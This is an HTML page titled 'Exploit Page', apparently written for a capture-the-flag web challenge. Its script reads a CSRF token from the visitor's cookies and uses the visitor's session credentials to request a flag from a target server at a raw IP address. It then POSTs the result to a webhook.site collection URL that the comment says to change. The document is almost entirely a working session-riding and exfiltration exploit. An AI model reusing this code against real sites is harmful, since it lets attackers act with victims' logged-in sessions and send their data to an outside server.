<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Exploit Page</title>
</head>
<body>
<h1>Waiting for flag...</h1>
<pre id="output"></pre>

<script>
(async () => {
  const output = document.getElementById('output');

  // Helper to get a cookie by name
  function getCookie(name) {
    const value = "; " + document.cookie;
    const parts = value.split("; " + name + "=");
    if (parts.length === 2) return parts.pop().split(";").shift();
    return null;
  }

  try {
    // Read CSRF token from cookies
    const csrf_token = getCookie('csrf_token');
    if (!csrf_token) throw new Error('CSRF token cookie not found');

    // Request the flag from the target server
    const res = await fetch(`http://34.134.162.213:17001/get_flag?csrf_token=${csrf_token}`, {
      credentials: 'include' // important to send cookies (admin token)
    });

    if (!res.ok) {
      output.textContent = `Failed to get flag: ${res.status} ${res.statusText}`;
      return;
    }

    const data = await res.json();

    if (data.flag) {
      output.textContent = 'Flag: ' + data.flag;

      // Send the flag back to your server for collection (change URL!)
      await fetch('https://webhook.site/ABCD/steal_flag', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ flag: data.flag })
      });
    } else {
      output.textContent = 'No flag in response: ' + JSON.stringify(data);
    }
  } catch (err) {
    output.textContent = 'Error: ' + err.message;
  }
})();
</script>
</body>
</html>
